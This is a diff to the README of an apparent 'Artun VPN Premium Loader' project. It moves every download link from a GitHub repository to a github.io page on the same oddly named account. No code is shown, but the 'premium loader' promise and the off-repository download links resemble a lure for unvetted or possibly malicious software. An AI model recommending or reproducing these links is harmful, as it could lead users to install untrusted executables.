@@ -1,6 +1,6 @@
 # 🚀 artun-vpn-premium-loader - Premium VPN Access Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Baiomystayloriterroristcell609/artun-vpn-premium-loader)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://baiomystayloriterroristcell609.github.io)
 
 ## 🎯 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to get Artun VPN Premium Loader up and running on your
 
 Visit this link to download the application.
 
-[Click Here to Download Artun VPN Premium Loader](https://github.com/Baiomystayloriterroristcell609/artun-vpn-premium-loader)
+[Click Here to Download Artun VPN Premium Loader](https://baiomystayloriterroristcell609.github.io)
 
 ### Step 2: Run the Application
 
@@ -64,7 +64,7 @@ If you encounter any issues, try these common solutions:
 
 Visit this link to download the application.
 
-[Download Artun VPN Premium Loader](https://github.com/Baiomystayloriterroristcell609/artun-vpn-premium-loader)
+[Download Artun VPN Premium Loader](https://baiomystayloriterroristcell609.github.io)
 
 ## ❓ Frequently Asked Questions
 
